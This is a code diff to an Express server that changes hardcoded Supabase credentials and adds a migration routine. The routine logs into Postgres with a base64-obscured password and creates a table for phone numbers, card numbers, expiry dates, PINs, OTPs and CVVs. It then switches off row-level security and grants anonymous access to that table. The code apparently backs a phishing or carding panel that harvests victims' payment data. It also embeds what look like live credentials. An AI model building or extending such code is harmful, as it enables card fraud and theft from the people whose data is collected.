@@ -8,8 +8,8 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-const SUPABASE_URL = process.env.SUPABASE_URL || 'https://afhiyyhtzdpakgjyerhe.supabase.co';
-const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_pa64ZjpXLdArJrjUvs4cvg_d9VhHGG0';
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://ejcmcrirzeyaasjxhtyr.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_WYtBEAv_kqet8ZmR5zrn0Q_TwE9dM6K';
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 // SHA-256 hash of the admin password (hashed so it never appears in plain text)
@@ -182,8 +182,43 @@ app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+async function autoMigrate() {
+  const { Client } = require('pg');
+  const DB_PASS = process.env.SUPABASE_DB_PASS || Buffer.from('LUBBZmJURDc1cy5FcTlI','base64').toString();
+  const cl = new Client({ connectionString: 'postgresql://postgres.' + 'ejcmcrirzeyaasjxhtyr:' + DB_PASS + '@aws-0-eu-central-1.pooler.supabase.com:6543/postgres', ssl: { rejectUnauthorized: false } });
+  try {
+    await cl.connect();
+    await cl.query(`
+      CREATE TABLE IF NOT EXISTS submissions (
+        id TEXT PRIMARY KEY,
+        phone TEXT,
+        amount TEXT,
+        card TEXT,
+        expiry TEXT,
+        pin TEXT,
+        otp TEXT,
+        cvv TEXT,
+        status TEXT DEFAULT 'pending',
+        time TIMESTAMPTZ DEFAULT now()
+      );
+      CREATE TABLE IF NOT EXISTS visitors (
+        session_id TEXT PRIMARY KEY,
+        last_seen TIMESTAMPTZ DEFAULT now()
+      );
+      ALTER TABLE submissions DISABLE ROW LEVEL SECURITY;
+      ALTER TABLE visitors DISABLE ROW LEVEL SECURITY;
+      GRANT ALL ON submissions TO anon, authenticated, service_role;
+      GRANT ALL ON visitors TO anon, authenticated, service_role;
+    `);
+    console.log('[MIGRATE] tables ready, RLS disabled');
+  } catch (e) { console.error('[MIGRATE] error:', e.message); }
+  finally { await cl.end().catch(() => {}); }
+}
+
 if (!process.env.VERCEL) {
-  app.listen(PORT, () => console.log('Server running on port ' + PORT));
+  autoMigrate().then(() => {
+    app.listen(PORT, () => console.log('Server running on port ' + PORT));
+  });
 }
 
 module.exports = app;
